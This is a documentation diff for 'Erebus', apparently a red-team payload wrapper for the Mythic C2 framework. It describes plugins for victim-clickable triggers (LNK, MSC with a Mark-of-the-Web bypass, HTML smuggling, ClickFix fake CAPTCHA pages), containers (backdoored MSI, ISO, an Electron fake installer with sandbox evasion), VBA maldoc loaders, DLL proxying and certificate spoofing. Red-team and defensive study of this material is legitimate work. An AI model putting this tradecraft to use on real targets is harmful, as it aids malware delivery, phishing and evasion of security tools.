-```python
-def register(self) -> Dict[str, Callable]:
-    return {
-        "function_name_1": self.function_1,
-        "function_name_2": self.function_2,
-        "function_name_3": self.function_3,
-    }
-```
-
-These functions are automatically discovered and made available to the builder.
-
-## Summary
-
-The Erebus plugin system provides:
-- ✅ Automatic plugin discovery and loading
-- ✅ Clean separation of concerns
-- ✅ Easy extensibility without core modifications
-- ✅ Dependency management
-- ✅ Validation and error handling
-- ✅ Standardized testing framework
-- ✅ Mythic RPC integration for operational visibility
-- ✅ Comprehensive documentation and examples
-
-To create a new plugin, simply copy the template, implement your functionality, and save it in the `modules/` directory.
+## Plugin categories
+
+| Category | Purpose |
+|---|---|
+| `TRIGGER` | Victim-clickable artefacts that launch the compiled loader (`.lnk`, `.bat`, `.msi`, `.msc`, `.html`, ClickOnce) |
+| `CONTAINER` | Distribution wrappers (`ISO`, `7z`, `Zip`, `MSI`, `Electron`) |
+| `PAYLOAD` | Loader-adjacent transforms (DLL proxy generation, MalDoc generation, XLL add-ins) |
+| `CODESIGNER` | AuthentiCode signing of produced artefacts (self-signed, URL-spoofed, provided cert) |
+| `OTHER` | Utility functions that don't fit the above |
+
+## Trigger plugins
+
+### LNK
+
+*Windows shortcut (`.lnk`) that executes a trigger binary with configurable args, icon, and optional decoy chain. Built natively on Linux via `pylnk3` - no Windows host required.*
+
+- **Module:** [plugin_trigger_lnk.py](Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules/plugin_trigger_lnk.py)
+- **Consumes:** `0.9a Trigger Binary`, `0.9b Trigger Command`, `0.13 Decoy File`
+- **Key features:**
+  - Configurable target binary + command-line arguments
+  - Icon resolution from any system DLL (e.g. `shell32.dll,0`)
+  - Optional decoy file execution chain
+  - Pure-Python; runs inside the Mythic Docker container
+- **Output:** `payload/<trigger>.lnk`
+
+### BAT
+
+*Batch-script (`.bat`) trigger that chains the trigger binary and a decoy document display.*
+
+- **Module:** [plugin_trigger_bat.py](Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules/plugin_trigger_bat.py)
+- **Consumes:** `0.9a Trigger Binary`, `0.9b Trigger Command`, `0.13 Decoy File`
+- **Key features:**
+  - Minimal two-line batch template
+  - Environment-variable tricks for path obfuscation
+  - Staged execution timing via `timeout` delays
+- **Output:** `payload/<trigger>.bat`
+
+### MSI Trigger
+
+*MSI package used as a direct execution trigger (distinct from the MSI container - the trigger variant contains the compiled loader as a CustomAction rather than wrapping a pre-existing binary).*
+
+- **Module:** [plugin_trigger_msi.py](Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules/plugin_trigger_msi.py)
+- **Consumes:** `0.9 Trigger Type = MSI`, plus the `5.x` MSI Options section
+- **Key features:** CustomAction-based execution, configurable install scope and conditions.
+- **Output:** `payload/<trigger>.msi`
+
+### MSC (GrimReaper)
+
+*Windows Management Console snap-in (`.msc`) activated by Explorer via `mmc.exe`. Uses a custom `ConsoleTaskpad` structure with a Mark-of-the-Web bypass variant.*
+
+- **Module:** [plugin_trigger_msc.py](Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules/plugin_trigger_msc.py)
+- **Consumes:** `0.9 Trigger Type = MSC`
+- **Key features:**
+  - Process lineage parents under `mmc.exe` (a legitimate signed Windows binary)
+  - No file-extension warning dialog on Explorer double-click
+  - XML-based, bypasses some AV file-scanning heuristics
+- **Output:** `payload/<trigger>.msc`
+
+### ClickOnce Trigger
+
+*ClickOnce application manifest (`.application`) that downloads and runs a .NET loader via the Windows ClickOnce deployment platform.*
+
+- **Module:** [plugin_trigger_clickonce.py](Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules/plugin_trigger_clickonce.py)
+- **Consumes:** `0.9 Trigger Type = ClickOnce`
+- **Key features:** Manifest signing support, hash verification, deployment-URL-based lure.
+- **Output:** `payload/<trigger>.application` + satellite files
+
+### HTML Smuggling
+
+*Self-contained `.html` page with the loader XOR-obfuscated (per-build random 16-byte key) and base64-embedded. JavaScript reverses both layers at runtime and reconstructs a `Blob` for download, so the encoded payload never traverses the network and gateway base64 scanners see nothing.*
+
+- **Module:** [plugin_trigger_html_smuggling.py](Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules/plugin_trigger_html_smuggling.py)
+- **Consumes:** `0.9 Trigger Type = HTML`
+- **Key features:**
+  - Per-build random XOR key - no two pages share a decoder fingerprint
+  - Randomised JavaScript variable identifiers
+  - Configurable page title, heading, body text, button label, and download filename (malleable lure)
+  - Optional auto-download with configurable delay
+- **Output:** `payload/<trigger>.html`
+
+### ClickFix
+
+*Fake CAPTCHA / verification HTML page that silently copies a configured command (typically a PowerShell download cradle) to the clipboard via `navigator.clipboard.writeText`, then walks the victim through Win+R → Ctrl+V → Enter to execute it. Defeats file-based AV entirely - no binary artefact leaves the browser.*
+
+- **Module:** [plugin_trigger_html_smuggling.py](Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules/plugin_trigger_html_smuggling.py) *(shares the module with HTML Smuggling)*
+- **Consumes:** `0.9 Trigger Type = ClickFix`, `0.9c ClickFix Command`
+- **Key features:**
+  - Malleable branding: `brand_name`, `brand_color`, heading/message, per-step instruction text, button label
+  - Command escaped for safe JS embedding
+  - Works on all modern browsers without plugins or permission prompts
+- **Output:** `payload/<trigger>.html`
+
+## Container plugins
+
+### Archive (7z / Zip)
+
+*Compressed archive containers with optional password protection and file-attribute hiding.*
+
+- **Module:** [plugin_archive_container.py](Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules/plugin_archive_container.py)
+- **Consumes:** `3.0 Container Type = 7z|Zip`, `3.1 Compression Level`, `3.2 Archive Password`
+- **Key features:**
+  - 7z with LZMA2 compression + optional AES-256 + header encryption (`-mhe`)
+  - ZIP with ZipCrypto or AES password protection
+  - Hide non-trigger files from the visible archive listing via file attributes
+- **Output:** `payload/<name>.{7z,zip}`
+
+### ISO
+
+*ISO9660/Joliet disk image that Explorer mounts as a drive when double-clicked.*
+
+- **Module:** [plugin_container_iso.py](Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules/plugin_container_iso.py)
+- **Consumes:** `3.0 Container Type = ISO`, `4.0 ISO Volume ID`, `4.1 ISO enable Autorun`, `4.2 ISO Backdoor File`
+- **Key features:**
+  - Custom volume label (appears in Explorer)
+  - Optional `autorun.inf` generation
+  - Joliet-extension file hiding
+  - Optional backdoor mode - inject the payload into an existing uploaded ISO
+- **Output:** `payload/<name>.iso`
+
+### MSI
+
+*Windows Installer database created via `wixl` (msitools), optionally backdooring an existing MSI.*
+
+- **Module:** [plugin_container_msi.py](Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules/plugin_container_msi.py)
+- **Consumes:** `3.0 Container Type = MSI`, `5.0` – `5.9` MSI Options
+- **Key features:**
+  - Create-from-scratch MSI via WiX source generation
+  - Backdoor an existing MSI with multiple attack vectors: `execute`, `run-exe`, `load-dll`, `dotnet`, `script`
+  - CAB-stream bundling for additional payload files
+  - Configurable install scope (User / Machine), execution conditions, custom action names
+- **Output:** `payload/<name>.msi`
+
+### ClickOnce Container
+
+*ClickOnce deployment package (`.application` + application manifest + deployed exe), hash-verified.*
+
+- **Module:** [plugin_container_clickonce.py](Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules/plugin_container_clickonce.py)
+- **Consumes:** `3.0 Container Type = ClickOnce`
+- **Key features:** Full ClickOnce manifest generation, SHA-256 file hashing, trusted-publisher execution model.
+- **Output:** `payload/<name>/` (deployment tree)
+
+### Electron Fake-Installer
+
+*Single portable Windows `.exe` built with `electron-builder`. Wraps the compiled loader as an `extraResources` tree and presents a Next / Install / Finish wizard. The wizard stages the embedded loader to `%TEMP%\inst-<uuid>` and spawns it detached + hidden - but only after passing a two-gate guardrail system.*
+
+- **Module:** [plugin_container_electron.py](Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules/plugin_container_electron.py)
+- **Consumes:** `3.0 Container Type = Electron`, `3.E0` – `3.E9p` Electron Options
+- **Key features:**
+  - **Two build modes** - `In-Container (Wine)` (one-step Linux build via wine for rcedit/winCodeSign) or `Deferred (Erebus.Helper)` (stage source + `build_electron.bat` for a Windows host)
+  - **PE resource rewriting** - all six Windows Properties → Details fields (FileDescription, ProductName, ProductVersion, FileVersion, Copyright, CompanyName) are operator-controlled via `3.E0`/`3.E1`/`3.E2`/`3.E7`/`3.E8`
+  - **Custom icon upload** (`3.E6a`) accepting PNG/JPEG/GIF/BMP/WEBP/TIFF/SVG; SVG is rasterised to 512×512 via `cairosvg`, then Pillow produces a multi-size ICO (16/24/32/48/64/128/256) embedded via rcedit
+  - **Three entry formats** - `exe` (direct `CreateProcess`), `dll` (`rundll32.exe <dll>,<entry>`), `xll` (`excel.exe /e <xll>`)
+  - **Two-gate guardrail system** - interaction token (dwell time + real mousemove required before the token is issued) + 15 environment checks (debugger, sandbox env vars, default bad usernames/hostnames, operator-supplied white/blocklists, min screen size, min CPU count, min RAM, max idle time, pre-spawn delay). Guardrail failures are silent: the wizard still shows fake progress → Finish even when the loader never ran.
+- **Output:** `payload/erebus.exe` (portable fake-installer)
+
+## Payload plugins
+
+### DLL Proxy Generation
+
+*Generates a DLL proxy DEF file for DLL sideloading chains.*
+
+- **Module:** [plugin_payload_dll_proxy.py](Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules/plugin_payload_dll_proxy.py)
+- **Consumes:** `0.0 Main Payload Type = Hijack`, `1.0 DLL Hijacking` (uploaded source DLL)
+- **Key features:**
+  - Automatic export parsing from the uploaded target DLL via `pefile`
+  - Generates a `proxy.def` that forwards all target exports back to the original DLL
+  - Integrates with the C++ loader compilation pipeline so the generated proxy gets compiled + linked automatically
+- **Output:** `payload/erebus.dll` (proxy DLL with embedded shellcode)
+
+### MalDocs (Excel VBA + XLL)
+
+*Creates Excel documents (XLSM/XLSX/XLAM) with VBA payloads or compiles XLL Add-In DLLs. VBA is compiled to a valid `vbaProject.bin` directly on Linux via `agent_code/vba_compiler/`.*
+
+- **Module:** [plugin_payload_maldocs.py](Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules/plugin_payload_maldocs.py)
+- **Consumes:** `0.9 Create MalDoc`, `0.9a` – `0.9p` MalDoc Options
+- **Key features:**
+  - **Three output modes**: `VBA Module Only` (`.bas` for manual import), `Create/Backdoor Excel` (full workbook), `XLL Add-In DLL` (native Excel add-in)
+  - **Four VBA loader techniques**: `VirtualAlloc+CreateThread` (classic), `EnumSystemLocalesA` (callback-based), `QueueUserAPC` (no new thread), `Process Hollowing` (notepad.exe host)
+  - **Dynamic payload discovery** - `FindPayload` VBA function searches `ThisWorkbook.Path`, `%TEMP%`, `%APPDATA%`, `%USERPROFILE%\Desktop|Downloads|Documents`, OneDrive-synced shell folders at runtime. Path quoting via `Chr(34)` handles spaces. Macro exits silently if the payload is not found.
+  - **Linux-native build** - VBA is compiled on the Mythic Docker container via the built-in MS-OVBA-compliant compiler; optional Windows-side COM re-injection via `erebus_helper.py` is available for higher-fidelity output via `build_maldoc.bat`
+  - **XLL support** - generates C/C++ XLL source with configurable injection method, compiler (MSVC/MinGW), guardrail injection, and extra linker flags; XLL compilation is deferred to a Windows host via `erebus_helper.py xll`
+  - **Execution triggers**: AutoOpen, OnClose, OnSave
+  - **VBA obfuscation** toggle (variable renaming, string splitting, dead-code insertion)
+- **Output:** `payload/<name>.{xlsm,xlsx,xlam}`, or `payload/<name>.bas` + optional `build_maldoc.bat`, or staged XLL source + `build_xll.bat`
+
+## CodeSigner plugin
+
+### CodeSigner
+
+*Applies AuthentiCode signatures to loader binaries and container outputs via `osslsigncode`. Runs post-compile.*
+
+- **Module:** [plugin_codesigner.py](Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules/plugin_codesigner.py)
+- **Consumes:** `6.0 Codesign Loader`, `6.1 Codesign Type`, `6.2` – `6.6` Codesign Options
+- **Key features (three signing modes):**
+  - **SelfSign** - OpenSSL generates an X.509 cert with operator-supplied CN and Organisation Name; signs the payload with it.
+  - **Spoof URL** - fetches the SSL certificate details from a target URL and clones them into a self-signed cert. Matches a legitimate organisation's metadata without a real chain of trust.
+  - **Provide Certificate** - operator uploads a PFX/P12 file (plus optional password). Signed output has a real chain of trust; revocation exposure is the tradeoff.
+- **Output:** replaces the unsigned artefact in `payload/` with a signed copy.
+
+## Plugin dispatch
+
+`builder.py` declares a `_PLUGIN_FUNCTIONS` list at the top of the file; at import time, the plugin loader resolves each name through the auto-discovered plugins and injects the callable into `builder.py`'s global namespace. This means plugin functions are invoked **directly as function calls** from the builder - no wrapper layer.
+
+BuildParameter dispatch follows a predictable pattern:
+
+1. The operator selects a value (e.g. `3.0 Container Type = Electron`).
+2. `builder.py`'s `containerise_payload` method switches on that value and calls the corresponding plugin function (e.g. `build_electron_installer(...)`).
+3. The plugin reads the rest of its `3.E*` BuildParameters, does its work, and returns a `pathlib.Path` to the produced artefact.
+
+See the `match` statement in `containerise_payload` and the per-trigger-type dispatch in the trigger section of `build()` for the full plumbing.
+
+## Related documentation
+
+- **[Plugin Development]({{% relref "plugin-development.md" %}})** - writing, validating, and testing new plugins.
+- **[Development]({{% relref "development.md" %}})** - full BuildParameter reference and build-step pipeline.
+- **[OPSEC]({{% relref "opsec.md" %}})** - per-plugin tradecraft considerations and improvement suggestions.
